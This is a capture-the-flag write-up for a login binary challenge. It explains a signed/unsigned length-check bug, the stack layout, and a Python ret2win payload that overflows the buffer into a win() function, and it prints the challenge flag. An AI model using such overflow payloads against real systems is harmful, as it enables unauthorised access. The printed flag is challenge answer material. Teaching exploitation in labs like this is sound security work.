# The Password is Swordfish

> Statically linked login binary with a signed/unsigned comparison bug and a `win()` function that prints the flag.
> **Flag:** `flag{31af412437d5e37a}`

---

## Solution

### 1. Analysis

```text
ELF 64-bit, statically linked, no PIE, NX enabled
```

`checksec` reports a canary, but `login()` never touches `fs:0x28`, so there is no
real canary in the vulnerable function. `win()` at `0x401b85` reads `/flag.txt`
and prints it.

Stack layout in `login()`:

```text
rbp-0x54: length (int, from scanf)
rbp-0x50: buffer start      <- offset 0
rbp-0x08: temp char (int)   <- offset 72
rbp-0x04: counter (int)     <- offset 76
rbp+0x00: saved rbp         <- offset 80
rbp+0x08: return address    <- offset 88
```

### 2. The bug

The length check is signed:

```asm
cmp $0x40, %eax
jle login+0x8e
```

Sending `-1` makes `-1 <= 64` true, so the check passes. The read loop uses
`jb` (unsigned), so with length `0xFFFFFFFF` it only stops at a newline or EOF.
The buffer can be overflowed up to the return address.

### 3. Mind the counter

When the index reaches 76 it overwrites the counter itself. Writing `0x4c` (76)
keeps it consistent after the increment, and bytes 77-79 must be `0x00`.

### 4. Exploit

```python
payload  = b'A' * 76              # padding
payload += b'\x4c\x00\x00\x00'    # preserve counter
payload += b'B' * 8               # saved rbp
payload += p64(0x401b85)          # return into win()
```

Send length `-1`, then the payload and a newline.

```bash
$ python3 exploit.py
```

`win()` opens `/flag.txt` on the server and prints it. The "Access denied" message
from `strcmp` still appears before the function returns into `win()`.

### 5. Flag

```text
flag{31af412437d5e37a}
```

## Lesson

A signed comparison on a length coming from user input validates nothing. The
canary reported by `checksec` does not exist in every function, so always confirm
the actual stack layout in the disassembly.

---

### Credits

Part of the **FLUIDATTACKS CTF** (ctf.ae).
